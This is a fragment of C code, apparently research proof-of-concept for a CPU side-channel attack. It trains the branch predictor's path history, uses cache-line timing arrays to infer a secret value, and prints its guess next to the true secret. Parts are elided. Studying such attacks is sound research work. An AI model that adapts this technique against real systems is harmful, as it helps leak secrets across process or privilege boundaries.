...
for(int o = 0; o <= offset; o++) {
    int maxx = PHR_LEN-o-1;
    if(guess >= maxx) break;
    for (int k = 0; k < ATK_ROUNDS; k++) {
    // train S(0, 0, PHR_LEN) ~ S(0, PHR_LEN, 0)
        for (int i = 0; i < PHR_LEN-o; i++) {
        // for (int i = 36; i < 37; i++) {
            int t = reverse ? PHR_LEN-o-i-1 : i;
            // if (reverse)
            //     len_array[(PHR_LEN-o-i-1)*Cache_Line] = PHR_LEN-o-i-1;
            // else len_array[i*Cache_Line] = i;
            len_array[t*Cache_Line] = t;
            for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            // puts("1");
                tmp+=PHR_Flush(t, PHR_LEN-o-1-t);
                // if (reverse)
                //     tmp+=PHR_Flush(PHR_LEN-o-i-1, i);
                // else tmp+=PHR_Flush(i, PHR_LEN-o-i-1);
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                asm volatile("mfence");
            ...
            // if (reverse)
            //     len_array[(PHR_LEN-o-i-1)*Cache_Line] = PHR_LEN+10;
            // else    
            //     len_array[i*Cache_Line] = PHR_LEN+10;
        }
    ...
    int ss=PHR_LEN-o-s-1;
    guess = ss > guess ? ss : guess;
    guesses[cnt++] = guess;
    // puts("");
}
    int timess[100];
    for (int i = 0; i < 100; i++) timess[i] = 0;
    for (int i = 0; i < cnt; i++)
        timess[guesses[i]]++;
    int mx_p, mx_num = -1;
    for (int i = 0; i < 100; i++)
        if (mx_num <= timess[i])
            mx_num = timess[i], mx_p = i;
    printf("guess (%d, %d) =?= %d secret\n", guess, mx_p, secret);
